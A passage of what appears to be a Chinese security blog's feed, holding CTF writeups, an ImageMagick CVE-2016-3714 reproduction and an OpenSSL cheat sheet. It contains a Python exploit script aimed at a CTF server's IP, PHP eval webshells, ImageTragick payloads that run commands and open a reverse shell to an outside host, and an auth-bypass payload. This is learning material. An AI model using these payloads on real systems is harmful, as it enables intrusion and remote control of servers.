&#125;</div><div class="line"></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>没法复现这道题目，少了几个关键的php，虽然能够看出来那个是凯撒加密的函数php，还有一个waf函数，但是代码能力太渣了。菜鸡web狗有的时候就是这样难受，做CTF拿到小部分原码复现不了真个题目。。。<br>这道题目代码逻辑大概流程。<br>Get进去的do从那数如果为，upload，则进入upload页面，如果为rename，就进入重命名页面。<br>在上传页面中，在代码的第22行有一个检测上传file是否存在php和<code>&lt;script&gt;</code>常见脚本的if判断，这是一个关键点，如果没有就把上传的文件放入在/uploads/下的一个随机数文件夹里，看到第27行的mt_rand()时，心里一抖，想到了wonderkun师傅关于<a href="http://wonderkun.cc/index.html/?cat=1" target="_blank" rel="external">随机数漏洞</a>的文章，可惜这道题目没有关联。<br>然后是rename页面，代码写的很乱，缕一缕思路，重命名页面的代码逻辑就是。GET进去的re参数先进行凯撒再base64再反序列化最后赋值给re2，如果数组长度为2（即里面只有filetype和filename），就创建一个新的随机数txt，再把数组的第0位值保存为rename值，如果数组没有第0位并且value值为数字型字符，就打开这个value.txt，再把内容保存到新随机数.txt，最后把新随机数.txt重命名为新随机数.rename。<br>这个代码我都看吐了，当初看了好久好久都没理清楚，还是大佬教我我才搞懂的。。。<br>这个题目其实就是一个逻辑漏洞，我可以通过re传入的3个文件来绕过对”&lt;?””php””<code>&lt;script&gt;</code>“的检测，然后在通过有第0位的re传入来重命名txt为php，这样就成功上传了webshell了。<br>3个php文件分别为</p><blockquote><p>1.php  =&gt;    &lt;<br>2.php  =&gt;    ?ph<br>3.php  =&gt;    p eval($_GET[‘a’]);</p></blockquote><ul><li><strong>EXP</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> phpserialize</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(c,i)</span>:</span></div><div class="line">    num = ord(c)</div><div class="line">    <span class="keyword">if</span> num &gt;= <span class="number">97</span> <span class="keyword">and</span> num &lt;= <span class="number">122</span>:</div><div class="line">        num = <span class="number">97</span> + ((num - <span class="number">97</span>) + i) % <span class="number">26</span></div><div class="line">    <span class="keyword">elif</span> num &gt;= <span class="number">65</span> <span class="keyword">and</span>  num &lt;= <span class="number">90</span>:</div><div class="line">        num = <span class="number">65</span> + ((num - <span class="number">65</span>) + i) % <span class="number">26</span></div><div class="line">    <span class="keyword">return</span> chr(num)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">kaisa</span><span class="params">(string,i)</span>:</span></div><div class="line">    string_new = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> string:</div><div class="line">        string_new += change(s,i)</div><div class="line">    <span class="keyword">return</span> string_new</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(string)</span>:</span></div><div class="line">    <span class="comment"># 获取凯撒位移6的加密内容</span></div><div class="line">    kaisa_6 = kaisa(string,<span class="number">6</span>)</div><div class="line">    <span class="comment"># 获取凯撒位移20的加密内容</span></div><div class="line">    kaisa_20 = kaisa(string,<span class="number">20</span>)</div><div class="line"></div><div class="line">    code = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,len(kaisa_6)):</div><div class="line">        kaisa_6_ord = ord(kaisa_6[x])</div><div class="line">        kaisa_20_ord = ord(kaisa_20[x])</div><div class="line"></div><div class="line">        <span class="comment">#判断凯撒位移20的是否是小写的值，是的话就加上</span></div><div class="line">        <span class="keyword">if</span> kaisa_20_ord &gt;= <span class="number">97</span> <span class="keyword">and</span> kaisa_20_ord &lt;= <span class="number">122</span>:</div><div class="line">            code += str(kaisa_20[x])</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            code += str(kaisa_6[x])</div><div class="line">    <span class="keyword">return</span> code</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(code)</span>:</span></div><div class="line">    <span class="keyword">import</span> re</div><div class="line">    <span class="keyword">import</span> requests</div><div class="line">    url = <span class="string">"http://139.129.108.53:3366/web-03/index.php?do=rename&amp;re=%s"</span> % (code)</div><div class="line">    check = <span class="string">"http://139.129.108.53:3366/web-03"</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        response  = requests.get(url, verify=<span class="keyword">False</span>, timeout=<span class="number">5</span>)</div><div class="line">        reg = <span class="string">"rename\!\.(.*?)&lt;/body"</span></div><div class="line">        path = re.findall(reg,response.content)</div><div class="line">        <span class="keyword">if</span> len(path) &gt;= <span class="number">1</span>:</div><div class="line">            <span class="keyword">print</span> check+path[<span class="number">0</span>]</div><div class="line">    <span class="keyword">except</span> Exception,e:</div><div class="line">        print(e)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) &gt;= <span class="number">2</span>:</div><div class="line">        lists = [sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>]]      <span class="comment">#重命名</span></div><div class="line">        <span class="comment"># lists = &#123;1:sys.argv[1], 2:sys.argv[2]&#125;  #合并</span></div><div class="line">        <span class="comment"># print phpserialize.dumps(lists)</span></div><div class="line">        string = base64.b64encode(phpserialize.dumps(lists))</div><div class="line">        code = main(string)</div><div class="line">        request(code)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">u'sys'</span>)</div></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ISCC这次的题目除了那道jpg和txt的题目是真的有意思，其他的题目感觉差点“意思”。&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://whc.dropsec.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://whc.dropsec.xyz/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://whc.dropsec.xyz/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>ImageMagick远程命令执行（CVE-2016-3714）复现与理解</title>
    <link href="http://whc.dropsec.xyz/2017/05/23/ImageMagick%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2016-3714%EF%BC%89%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%90%86%E8%A7%A3/"/>
    <id>http://whc.dropsec.xyz/2017/05/23/ImageMagick远程命令执行（CVE-2016-3714）复现与理解/</id>
    <published>2017-05-23T07:56:41.000Z</published>
    <updated>2017-06-16T04:26:14.574Z</updated>
    
    <content type="html"><![CDATA[<p>第一次真正意义上的复现漏洞，花费了很多时间在漏洞平台的搭建上，在实验室大佬的提示下，自己的kali虚拟机上有convert也就是ImageMagick，然后。。。算了进入正题。</p><h3 id="ImageMagick简介"><a href="#ImageMagick简介" class="headerlink" title="ImageMagick简介"></a>ImageMagick简介</h3><p>ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。<br>这里是ImageMagick在Linux的convert的 应用<a href="http://www.cnblogs.com/ITtangtang/p/3951240.html" target="_blank" rel="external">http://www.cnblogs.com/ITtangtang/p/3951240.html</a></p><a id="more"></a><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p>初心师傅wp<br><a href="https://ricterz.me/posts/Write%20Up:%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1" target="_blank" rel="external">https://ricterz.me/posts/Write%20Up:%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1</a><br>实验室大佬Isron：<br><a href="http://isron.cn/2017/03/29/CVE-2016-3714/" target="_blank" rel="external">http://isron.cn/2017/03/29/CVE-2016-3714/</a><br>Rcoll大佬：<br><a href="http://rcoil.me/2017/03/CVE-2016-3714/" target="_blank" rel="external">http://rcoil.me/2017/03/CVE-2016-3714/</a><br>Freebuf：<br><a href="http://www.freebuf.com/vuls/104048.html" target="_blank" rel="external">http://www.freebuf.com/vuls/104048.html</a><br>推酷：<br><a href="http://www.tuicool.com/articles/InE7z2e" target="_blank" rel="external">http://www.tuicool.com/articles/InE7z2e</a></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在ImageMagick解析图片时，如果图片的地址是<code>https://</code>开头的，就调用InvokeDelegate，执行MagickCore/delegate.c的<a href="https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L407" target="_blank" rel="external">407</a>行<br>的一条命令<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;delegate decode=\<span class="string">"https\" command=\"&amp;quot;wget&amp;quot; -q -O &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;\"/&gt;</span></div><div class="line"><span class="string">（&amp;quot是html的 "</span>）`</div></pre></td></tr></table></figure></p><p>具体的代码执行，函数的调用过程在这篇文章上面（<a href="http://www.freebuf.com/vuls/104048.html" target="_blank" rel="external">http://www.freebuf.com/vuls/104048.html</a> ）<br>（PS：我看网上有几篇文章说的执行的是curl命令，在 /etc/ImageMagick/delegates.xml 文件中，内容如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ImageMagick cat /etc/ImageMagick/delegates.xml | grep https &lt;delegate decode=&quot;https&quot; command=&quot;&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;&quot;/&gt;`）</div></pre></td></tr></table></figure></p><p>而其中的%o和%M定义如下:</p><blockquote><p> %i  input image filename<br> %o  output image filename<br> %u  unique temporary filename<br> %Z  unique temporary filename<br> %#  input image signature<br> %b  image file size<br> %c  input image comment<br> %g  image geometry<br> %h  image rows (height)<br> %k  input image number colors<br> %l  image label<br> %m  input image format<br> %p  page number<br> %q  input image depth<br> %s  scene number<br> %w  image columns (width)<br> %x  input image x resolution<br> %y  input image y resolution</p></blockquote><p>执行的命令就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;wget&quot; -q -O  &quot;%o&quot; &quot;https:%M&quot;</div></pre></td></tr></table></figure></p><p>还有一个版本是curl的，2个命令的作用都是从网络上获取文件。<br>这个代码本意是从网络上这个地址获取这个图片，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;wget&quot; -q -O  &quot;1.png&quot; &quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/logo_white_fe6da1ec.png&quot;</div></pre></td></tr></table></figure><p><img src="https://ooo.0o0.ooo/2017/06/15/594241ab2afa6.png" alt=""><br>ImageMagick官方补丁就是在%M这个地方加了个过滤函数，过滤关键字。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><blockquote><p>push graphic-context<br>viewbox 0 0 640 480<br>fill ‘url(<a href="https://example.com/image.jpg&quot;|id" target="_blank" rel="external">https://example.com/image.jpg&quot;|id</a>“)’<br>pop graphic-context</p></blockquote><ul><li>push和pop是用于堆栈的操作，一个进栈，一个出栈;</li><li>viewbox是表示SVG可见区域的大小，或者可以想象成舞台大小，画布大小。简单理解就是根据后面得参数选取其中得一部分画面;</li><li>fill url()是把图片填充到获取图片地址的元素内;</li></ul><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>测试环境kali2016<br>imagemagick版本为6.8.9-9，在漏洞影响范围内<br>新建一个空的exploit.png，用vi写入poc</p><blockquote><p>push graphic-context<br>viewbox 0 0 640 480<br>fill ‘url(<a href="https://example.com/image.jpg&quot;|ls" target="_blank" rel="external">https://example.com/image.jpg&quot;|ls</a> -al”)’<br>pop graphic-context</p></blockquote><p>直接使用convert命令<br><img src="https://ooo.0o0.ooo/2017/06/15/5942412545a48.png" alt=""><br>可以明确地看到执行了ls -al命令，如果在web应用上，直接上传一个类似的图片，可以直接执行任何命令。</p><p>我这偷懒了，直接在本地有漏洞版本的虚拟机上验证了，没有搭建web服务。<br>最近也在学docker，然后看到p牛的项目Vulapp上有搭建好的环境，拉下来直接用（最近实验室网不太好，3-400M的东西不好下）。</p><blockquote><p>获取镜像<br>docker pull medicean/vulapps:i_imagemagick_1<br>运行镜像<br>docker run -d -p 8000:80 –name=i_imagemagick_1<br>medicean/vulapps:i_imagemagick_1<br>进入交互式shell<br>docker run -t -i medicean/vulapps:i_imagemagick_1 “/bin/bash”  </p></blockquote><p>这个镜像里面，该有的都有了<br><img src="https://ooo.0o0.ooo/2017/06/15/594241c20bb35.png" alt=""><br>执行命令</p><blockquote><p>docker exec i_imagemagick_1 convert /poc.png 1.png</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/06/15/594241efd3861.png" alt=""></p><p>效果跟上面一样</p><h3 id="漏洞运用方式"><a href="#漏洞运用方式" class="headerlink" title="漏洞运用方式"></a>漏洞运用方式</h3><ul><li>命令执行：</li></ul><blockquote><p>push graphic-context<br>viewbox 0 0 640 480<br>fill ‘url(<a href="https://example.com/image.jpg&quot;|ls" target="_blank" rel="external">https://example.com/image.jpg&quot;|ls</a> -al”)’<br>pop graphic-context</p></blockquote><p>可以直接在里面写入webshell：</p><blockquote><p>push graphic-context<br>viewbox 0 0 640 480<br>fill ‘url(<a href="https://example.com/1.jpg&quot;|echo" target="_blank" rel="external">https://example.com/1.jpg&quot;|echo</a> \‘&lt;?php eval($_POST[\‘Isron\‘]);?&gt;\‘ shell.php”)’<br>pop graphic-context</p></blockquote><p>也可以反弹shell：</p><blockquote><p>push graphic-context<br>viewbox 0 0 640 480<br>fill ‘url(<a href="https://example.com/image.jpg&quot;|bash" target="_blank" rel="external">https://example.com/image.jpg&quot;|bash</a> -i &gt;&amp; /dev/tcp/外网服务器ip/12340 0&gt;&amp;1”)’<br>pop graphic-context</p></blockquote><p>这个反弹shell命令原理</p><blockquote><p>bash -i &gt;&amp; /dev/tcp/外网服务器ip/12340 0&gt;&amp;1  </p></blockquote><p>实验室大大大佬发了一篇<a href="http://byd.dropsec.xyz/2017/04/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E5%88%86%E6%9E%90/" target="_blank" rel="external">文章</a>，让我茅塞顿开。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次真正意义上的复现漏洞，花费了很多时间在漏洞平台的搭建上，在实验室大佬的提示下，自己的kali虚拟机上有convert也就是ImageMagick，然后。。。算了进入正题。&lt;/p&gt;
&lt;h3 id=&quot;ImageMagick简介&quot;&gt;&lt;a href=&quot;#ImageMagick简介&quot; class=&quot;headerlink&quot; title=&quot;ImageMagick简介&quot;&gt;&lt;/a&gt;ImageMagick简介&lt;/h3&gt;&lt;p&gt;ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。&lt;br&gt;这里是ImageMagick在Linux的convert的 应用&lt;a href=&quot;http://www.cnblogs.com/ITtangtang/p/3951240.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/ITtangtang/p/3951240.html&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://whc.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞复现" scheme="http://whc.dropsec.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>CTF中Openssl常用命令</title>
    <link href="http://whc.dropsec.xyz/2017/05/10/CTF%E4%B8%ADOpenssl%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://whc.dropsec.xyz/2017/05/10/CTF中Openssl常用命令/</id>
    <published>2017-05-10T12:07:37.000Z</published>
    <updated>2017-07-02T13:26:24.019Z</updated>
    
    <content type="html"><![CDATA[<p>openssl命令详解</p><p><a href="http://blog.csdn.net/zzxian/article/details/7739673" target="_blank" rel="external">http://blog.csdn.net/zzxian/article/details/7739673</a></p><h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p><a href="http://www.linuxidc.com/Linux/2016-03/129562.htm" target="_blank" rel="external">http://www.linuxidc.com/Linux/2016-03/129562.htm</a>  </p><p>比如要用des的cbc模式，参数就是des-cbc，非常方便. </p><p>openssl enc -help一下<br><a id="more"></a><br> 几个最常见的参数<br>[in/out]<br>这两个参数指定输入文件和输出文件，加密是输入文件是明文，输出文件是密文；解密时输入文件是密文，输出文件是明文。</p><p>[pass]<br>指定密码的输入方式，共有五种方式：命令行输入(stdin)、文件输入(file)、环境变量输入(var)、文件描述符输入(fd)、标准输入(stdin)。默认是标准输入，及从键盘输入。</p><p>[e/d]<br>e:加密， d:解密 默认是加密</p><p>[-a/-base64]<br>由于文件加密后是二进制形式，不方便查看，使用该参数可以使加密后的内容经过base64编码，使其可读；同样，解密时需要先进行base64解编码，然后进行解密操作。</p><p>[K/IV]<br>默认文件的加密密钥的Key和IV值是有用户输入的密码经过转化生成的，但也可以由用户自己指定Key/IV值，此时pass参数不起作用</p><ol><li><strong>只对文件进行base64编码</strong></li></ol><p>对文件进行base64编码<br>openssl enc -base64 -in plain.txt -out base64.txt<br>对base64格式文件进行解密操作<br>openssl enc -base64 -d -in base64.txt -out plain2.txt<br>使用diff命令查看可知解码前后明文一样<br>diff plain.txt plain2.txt</p><ol><li><strong>不同形式输入密码</strong></li></ol><p>命令行输入，密码123456<br>openssl enc -aes-128-cbc -in plain.txt -out out.txt -pass pass:123456<br>文件输入，密码123456<br>echo 123456 &gt; passwd.txt<br>openssl enc -aes-128-cbc -in plain.txt -out out.txt -pass file:passwd.txt</p><ol><li><strong>对称加密（aes加盐举例）</strong></li></ol><p>openssl enc -aes-128-cbc -in plain.txt -out encrypt.txt -pass pass:123456 -P<br>salt=32F5C360F21FC12D<br>key=D7E1499A578490DF940D99CAE2E29EB1<br>iv =78EEB538897CAF045F807A97F3CFF498</p><p>openssl enc -aes-128-cbc -in plain.txt -out encrypt.txt -pass pass:123456 -P<br>salt=DAA482697BECAB46<br>key=9FF8A41E4AC011FA84032F14B5B88BAE<br>iv =202E38A43573F752CCD294EB8A0583E7</p><p>openssl enc -aes-128-cbc -in plain.txt -out encrypt.txt -pass pass:123456 -P -S 123<br>salt=1230000000000000<br>key=50E1723DC328D98F133E321FC2908B78<br>iv =1528E9AD498FF118AB7ECB3025AD0DC6</p><p>openssl enc -aes-128-cbc -in plain.txt -out encrypt.txt -pass pass:123456 -P -S 123<br>salt=1230000000000000<br>key=50E1723DC328D98F133E321FC2908B78<br>iv =1528E9AD498FF118AB7ECB3025AD0DC6</p><p>可以看到，不使用-S参数，salt参数随机生成，key和iv值也不断变化，当slat值固定时，key和iv值也是固定的。</p><h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><ol><li><strong>利用openssl进行rsa加密解密</strong></li></ol><p><a href="http://www.cnblogs.com/aLittleBitCool/archive/2011/09/22/2185418.html" target="_blank" rel="external">http://www.cnblogs.com/aLittleBitCool/archive/2011/09/22/2185418.html</a><br>做ctf，rsa加密加密经常用到openssl，比如这次在安恒杯涉及到的共模攻击。<br><!--more--></p><p>生成密钥<br>openssl genrsa -out test.key 1024</p><p>将这个文件中的公钥提取出来<br>openssl rsa -in test.key -pubout -out test_pub.key</p><p>生成的公钥加密文件<br>openssl rsautl -encrypt -in hello -inkey test_pub.key -pubin -out hello.en</p><p>解密文件<br>openssl rsautl -decrypt -in hello.en -inkey test.key -out hello.de2</p><ol><li><strong>openssl数字签名中的消息摘要用法</strong></li></ol><p><a href="http://www.cnblogs.com/gordon0918/p/5382541.html" target="_blank" rel="external">http://www.cnblogs.com/gordon0918/p/5382541.html</a></p><p>rsa密钥进行签名验证操作<br>openssl dgst -sign RSA.pem -sha256 -out sign.txt file.txt</p><p>rsa密钥来验证签名<br>openssl dgst -prverify test.key -sha256 -signature  sign.txt message.txt</p><p>利用公钥来验证签名<br>openssl dgst -verify  test_pub.key   -sha256 -signature  sign.txt message.txt</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;openssl命令详解&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/zzxian/article/details/7739673&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/zzxian/article/details/7739673&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;对称加密&quot;&gt;&lt;a href=&quot;#对称加密&quot; class=&quot;headerlink&quot; title=&quot;对称加密&quot;&gt;&lt;/a&gt;对称加密&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://www.linuxidc.com/Linux/2016-03/129562.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.linuxidc.com/Linux/2016-03/129562.htm&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;比如要用des的cbc模式，参数就是des-cbc，非常方便. &lt;/p&gt;
&lt;p&gt;openssl enc -help一下&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://whc.dropsec.xyz/categories/CTF/"/>
    
      <category term="工具" scheme="http://whc.dropsec.xyz/categories/CTF/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="CTF" scheme="http://whc.dropsec.xyz/tags/CTF/"/>
    
      <category term="密码学" scheme="http://whc.dropsec.xyz/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>绕过7个字符getshell</title>
    <link href="http://whc.dropsec.xyz/2017/05/08/%E7%BB%95%E8%BF%877%E4%B8%AA%E5%AD%97%E7%AC%A6getshell/"/>
    <id>http://whc.dropsec.xyz/2017/05/08/绕过7个字符getshell/</id>
    <published>2017-05-08T13:37:31.000Z</published>
    <updated>2017-07-02T13:26:23.054Z</updated>
    
    <content type="html"><![CDATA[<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><blockquote><p><a href="http://isron.dropsec.xyz/2017/04/10/shell-7/" target="_blank" rel="external">http://isron.dropsec.xyz/2017/04/10/shell-7/</a><br><a href="http://www.moonsos.com/post/256.html" target="_blank" rel="external">http://www.moonsos.com/post/256.html</a><br><a href="http://wonderkun.cc/index.html/?p=524" target="_blank" rel="external">http://wonderkun.cc/index.html/?p=524</a></p></blockquote><h3 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h3><p>从wonderkun师傅的<a href="https://github.com/clearloveQAQ/CTF_web/tree/master/web200-3" title="github" target="_blank" rel="external">github</a><br>上d下原码，在本地实现下。不多说，直接上原码<br><a id="more"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$_POST = dAddslashes($_POST);</div><div class="line">$_GET = dAddslashes($_GET);</div><div class="line">$username = <span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) ? $_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>();</div><div class="line">$password = <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) ? md5($_POST[<span class="string">'password'</span>]) : <span class="keyword">die</span>();</div><div class="line">$sql = <span class="string">"select password from users  where username='$username'"</span>;</div><div class="line">$result = $conn-&gt;query($sql);</div><div class="line"><span class="keyword">if</span> (!$result) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("用户名或密码错误!!")&lt;/script&gt;'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$row = $result-&gt;fetch_assoc();</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($row[<span class="number">0</span>] === $password) &#123;</div><div class="line">    $_SESSION[<span class="string">'username'</span>] = $username;</div><div class="line">    $_SESSION[<span class="string">'status'</span>] = <span class="number">1</span>;</div><div class="line">    header(<span class="string">"Location:./ping.php"</span>);</div><div class="line"></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"></div><div class="line">    <span class="keyword">die</span>(<span class="string">"&lt;script&gt;alert('用户名或密码错误!!')&lt;/script&gt;"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这里的post上去的数据进行全局过滤，不考虑注入，这个里面有一个绕过点，首先看到password在跟数据库的数据进行比对的时候是经过md5哈希过的，所以可以通过和md5(数组)=空来绕过$row[0]===$password。这里涉及一个绕过php强等于的过程，php的===不仅比较值，还比较类型。<a href="http://static.hx99.net/static/drops/tips-7679.html（php比较操作符的安全问题）" target="_blank" rel="external">http://static.hx99.net/static/drops/tips-7679.html（php比较操作符的安全问题）</a><br>现在如果我们输入一个空的username的话，row肯定为空，让passwordpost上去的时候为数组，这样就构成null=o开头的字符串，成功绕过$row[0] === $password</p><blockquote><p>playload：username=a&amp;&amp;password[]=a</p></blockquote><p>进入ping.php，有一个一看就像命令执行的ping命令的执行框。<br>查看原码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">$ip=<span class="keyword">isset</span>($_POST[<span class="string">'ip'</span>])?$_POST[<span class="string">'ip'</span>]:<span class="keyword">die</span>();</div><div class="line">    <span class="comment">// $ip =isset($_GET['ip'])?$_GET['ip']:die();</span></div><div class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;/i"</span>,$ip))&#123;</div><div class="line">          <span class="keyword">die</span>(<span class="string">"&lt;pre&gt;ip 格式错误!!&lt;/pre&gt;"</span>);</div><div class="line">    &#125;</div><div class="line">    $substitutions = <span class="keyword">array</span>(</div><div class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">';'</span> =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">'|'</span> =&gt; <span class="string">''</span>,</div><div class="line">     );</div><div class="line">   $ip = str_replace( array_keys( $substitutions ), $substitutions, $ip );</div><div class="line">  <span class="comment">//  echo strlen($ip)."&lt;/br&gt;";</span></div><div class="line">  <span class="comment">//  echo $ip;</span></div><div class="line">   <span class="keyword">if</span>(strlen($ip)&lt;<span class="number">7</span>||strlen($ip)&gt;<span class="number">15</span>)&#123;</div><div class="line">       <span class="keyword">die</span>(<span class="string">"&lt;pre&gt;ip 长度错误!&lt;/pre&gt;"</span>);</div><div class="line">   &#125;</div><div class="line">    $dir = <span class="string">'sandBox/'</span>.$_SERVER[<span 